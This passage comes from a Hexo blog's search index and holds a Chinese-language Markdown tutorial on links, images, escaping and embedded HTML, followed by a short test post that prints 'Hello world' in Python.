class="headerlink" title="3.带格式化的链接"></a>3.带格式化的链接</h4><p>这是我的**<a href="https://blog.takagisan.top/" title="Ken的博客">博客</a>**</p><p>这是我的*<a href="https://blog.takagisan.top/" title="Ken的博客">博客</a>*</p><p>This is <a href="#code"><code>code</code></a></p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">这是我的<span class="token bold"><span class="token punctuation">**</span><span class="token content"><span class="token url">[<span class="token content">博客</span>](<span class="token url">https://blog.takagisan.top</span> <span class="token string">"Ken的博客"</span>)</span></span><span class="token punctuation">**</span></span>这是我的<span class="token italic"><span class="token punctuation">*</span><span class="token content"><span class="token url">[<span class="token content">博客</span>](<span class="token url">https://blog.takagisan.top</span> <span class="token string">"Ken的博客"</span>)</span></span><span class="token punctuation">*</span></span>This is <span class="token url">[<span class="token content"><span class="token code-snippet code keyword">`code`</span></span>](<span class="token url">#code</span>)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-引用类型链接"><a href="#4-引用类型链接" class="headerlink" title="4.引用类型链接"></a>4.引用类型链接</h4><p>尽量如下样式</p><ul><li><code>[1]: https://en.wikipedia.org/wiki/Hobbit#Lifestyle</code></li></ul><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token list punctuation">-</span> <span class="token code-snippet code keyword">`[1]: https://en.wikipedia.org/wiki/Hobbit#Lifestyle`</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="十-图片语法"><a href="#十-图片语法" class="headerlink" title="十.图片语法"></a>十.图片语法</h3><p>要使用图像使用<a href="#code"><code>!</code></a>在方括号里添加替代文本在与圆括号放图片链接</p><p><img src="/images/Fuchenchenle.png" alt="这是一张图片" title="这是一个图片"></p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token url"><span class="token operator">!</span>[<span class="token content">这是一张图片</span>](<span class="token url">/images/Fuchenchenle.png</span> <span class="token string">"这是一个图片"</span>)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-链接图片"><a href="#1-链接图片" class="headerlink" title="1.链接图片"></a>1.链接图片</h4><p>和上面的区别是，使用了另外一个方括号把上面的内容括起来，然后使用了另外一个圆括号</p><p><a href="https://blog.takagisan.top/"><img src="/images/wordimage/huoshan.jpg" alt="这是一个图片"></a></p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown"><span class="token url">[<span class="token content">![这是一个图片</span>](<span class="token url">/images/Fuchenchenle.png</span>)</span>](https://blog.takagisan.top)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="十一-转义字符语法"><a href="#十一-转义字符语法" class="headerlink" title="十一.转义字符语法"></a>十一.转义字符语法</h3><p>要使原本用来格式化 Markdown 的字符在，前面添加反斜杠,\即可</p><p>*我好帅*</p><p>渲染代码如下</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">\*我好帅\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="1-可做转义的字符"><a href="#1-可做转义的字符" class="headerlink" title="1.可做转义的字符"></a>1.可做转义的字符</h4><p>根据官方文档，如下图,下图都可以通过反斜杠来转义</p><p><img src="/images/wordimage/zhuanyi.png" alt="转义"></p><h4 id="2-特殊字符自动转义"><a href="#2-特殊字符自动转义" class="headerlink" title="2.特殊字符自动转义"></a>2.特殊字符自动转义</h4><p>如下是官方文档原文</p><p>在 HTML 文件中，有两个字符需要特殊处理： <code>&lt;</code> 和 <code>&amp;</code> 。 <code>&lt;</code> 符号用于起始标签，<code>&amp;</code> 符号则用于标记 HTML 实体，如果你只是想要使用这些符号，你必须要使用实体的形式，像是 <code>&lt;</code> 和 <code>&amp;</code>。</p><p><code>&amp;</code> 符号其实很容易让写作网页文件的人感到困扰，如果你要打「AT&amp;T」 ，你必须要写成「<code>AT&amp;T</code>」 ，还得转换网址内的 <code>&amp;</code> 符号，如果你要链接到：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;images.google.com&#x2F;images?num&#x3D;30&amp;q&#x3D;larry+bird<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>你必须要把网址转成：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;images.google.com&#x2F;images?num&#x3D;30&amp;q&#x3D;larry+bird<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>才能放到链接标签的 <code>href</code> 属性里。不用说也知道这很容易忘记，这也可能是 HTML 标准检查所检查到的错误中，数量最多的。</p><p>Markdown 允许你直接使用这些符号，它帮你自动转义字符。如果你使用 <code>&amp;</code> 符号的作为 HTML 实体的一部分，那么它不会被转换，而在其它情况下，它则会被转换成 <code>&amp;</code>。所以你如果要在文件中插入一个著作权的符号，你可以这样写：</p><pre class="line-numbers language-none"><code class="language-none">&amp;copy;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Markdown 将不会对这段文字做修改，但是如果你这样写：</p><pre class="line-numbers language-none"><code class="language-none">AT&amp;T<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Markdown 就会将它转为：</p><pre class="line-numbers language-none"><code class="language-none">AT&amp;T<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>类似的状况也会发生在 <code>&lt;</code> 符号上，因为 Markdown 支持行内 html，如果你使用 <code>&lt;</code> 符号作为 HTML 标签的分隔符，那 Markdown 也不会对它做任何转换，但是如果你是写：</p><pre class="line-numbers language-none"><code class="language-none">4 &lt; 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Markdown 将会把它转换为：</p><pre class="line-numbers language-none"><code class="language-none">4 &lt; 5<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要特别注意的是，在 Markdown 的块级元素和内联元素中， <code>&lt;</code> 和 <code>&amp;</code> 两个符号都会被自动转换成 HTML 实体，这项特性让你可以很容易地用 Markdown 写 HTML。（在 HTML 语法中，你要手动把所有的 <code>&lt;</code> 和 <code>&amp;</code> 都转换为 HTML 实体。）</p><h3 id="十二-内嵌-HTML-标签"><a href="#十二-内嵌-HTML-标签" class="headerlink" title="十二.内嵌 HTML 标签"></a>十二.内嵌 HTML 标签</h3><p>如下是官方文档原文</p><p>HTML 的行级內联标签如 <code>&lt;span&gt;</code>、<code>&lt;cite&gt;</code>、<code>&lt;del&gt;</code> 不受限制，可以在 Markdown 的段落、列表或是标题里任意使用。依照个人习惯，甚至可以不用 Markdown 格式，而采用 HTML 标签来格式化。例如：如果比较喜欢 HTML 的 <code>&lt;a&gt;</code> 或 <code>&lt;img&gt;</code> 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图片语法。当你需要更改元素的属性时（例如为文本指定颜色或更改图像的宽度），使用 HTML 标签更方便些。</p><p>HTML 行级內联标签和区块标签不同，在內联标签的范围内， Markdown 的语法是可以解析的。</p><pre class="line-numbers language-none"><code class="language-none">This **word** is bold. This &lt;em&gt;word&lt;&#x2F;em&gt; is italic.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>渲染效果如下:</p><p>This <strong>word</strong> is bold. This <em>word</em> is italic.</p><h4 id="1-区块标签"><a href="#1-区块标签" class="headerlink" title="1.区块标签"></a>1.区块标签</h4><p>区块元素 ── 比如 <code>&lt;div&gt;</code>、<code>&lt;table&gt;</code>、<code>&lt;pre&gt;</code>、<code>&lt;p&gt;</code> 等标签，必须在前后加上空行，以便于内容区分。而且这些元素的开始与结尾标签，不可以用 tab 或是空白来缩进。Markdown 会自动识别这区块元素，避免在区块标签前后加上没有必要的 <code>&lt;p&gt;</code> 标签。</p><p>例如，在 Markdown 文件里加上一段 HTML 表格：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">This is a regular paragraph.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">></span></span>Foo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">></span></span>This is another regular paragraph.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>请注意，Markdown 语法在 HTML 区块标签中将不会被进行处理。例如，你无法在 HTML 区块内使用 Markdown 形式的<code>*强调*</code>。</p><h4 id="2-Html-用法最佳实践"><a href="#2-Html-用法最佳实践" class="headerlink" title="2.Html 用法最佳实践"></a>2.Html 用法最佳实践</h4><p>出于安全原因，并非所有 Markdown 应用程序都支持在 Markdown 文档中添加 HTML。如有疑问，请查看相应 Markdown 应用程序的手册。某些应用程序只支持 HTML 标签的子集。</p><p>对于 HTML 的块级元素 <code>&lt;div&gt;</code>、<code>&lt;table&gt;</code>、<code>&lt;pre&gt;</code> 和 <code>&lt;p&gt;</code>，请在其前后使用空行（blank lines）与其它内容进行分隔。尽量不要使用制表符（tabs）或空格（spaces）对 HTML 标签做缩进，否则将影响格式。</p><p>在 HTML 块级标签内不能使用 Markdown 语法。例如 <code>&lt;p&gt;italic and **bold**&lt;/p&gt;</code> 将不起作用。</p>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typora </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>testblog</title>
      <link href="/2022/01f403947e.html"/>
      <url>/2022/01f403947e.html</url>
      
        <content type="html"><![CDATA[<h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello world"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> test </category>
          
      </categories>
      
      
        <tags>
            
            <tag> test </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
